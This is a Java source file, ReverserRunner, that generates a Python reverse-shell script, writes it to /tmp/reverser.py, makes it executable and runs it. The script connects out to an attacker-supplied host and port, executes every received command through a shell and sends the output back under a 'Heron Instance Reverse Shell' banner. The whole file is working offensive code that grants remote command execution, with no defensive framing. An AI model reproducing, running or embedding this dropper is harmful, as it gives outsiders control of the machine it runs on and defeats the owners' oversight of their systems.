import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.net.Inet4Address;

/**
 * Created by TAISHI on 8/6/16.
 */
public class ReverserRunner {
  private StringBuilder reverser_py;
  private final static String filepath = "/tmp/reverser.py";
  public ReverserRunner(Inet4Address lhost, int lport) throws IOException, InterruptedException {
    reverser_py = new StringBuilder();
    reverser_py
        .append("#!/usr/bin/python\n")
        .append("import sys, socket, subprocess\n")
        .append("s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n")
        .append("s.connect(('").append(lhost.getHostAddress()).append("',").append(lport).append("))\n")
        .append("s.send('** Heron Instance Reverse Shell **\\n')\n")
        .append("while True:\n")
        .append("  s.send('> ')\n")
        .append("  data = s.recv(1024)\n")
        .append("  if data == 'exit':\n")
        .append("    break\n")
        .append("  proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n")
        .append("  stdout = proc.stdout.read() + proc.stderr.read()\n")
        .append("  s.send(stdout)\n")
        .append("s.close()");
    run(filepath);
  }

  private void run(String filepath) throws IOException, InterruptedException {
    write_to_file(filepath);
    Process chmod_proc = Runtime.getRuntime().exec("chmod +x " + filepath);
    chmod_proc.waitFor();
    if (chmod_proc.exitValue() == 0) {
      // not gonna wait
      Runtime.getRuntime().exec(filepath);
    } else {
      throw new RuntimeException("Chmod failed");
    }
  }

  private void write_to_file(String filepath)
      throws FileNotFoundException, UnsupportedEncodingException {
    PrintWriter writer = new PrintWriter(filepath, "UTF-8");
    writer.print(reverser_py);
    writer.close();
  }

  public static void main(String[] args) throws IOException, InterruptedException {
    if (args.length != 2) {
      System.out.printf("Usage: java ReverseRunner <lhost> <lport>");
      System.exit(1);
    }
    new ReverserRunner((Inet4Address) Inet4Address.getByName(args[0]),
        Integer.parseInt(args[1]));
  }
}
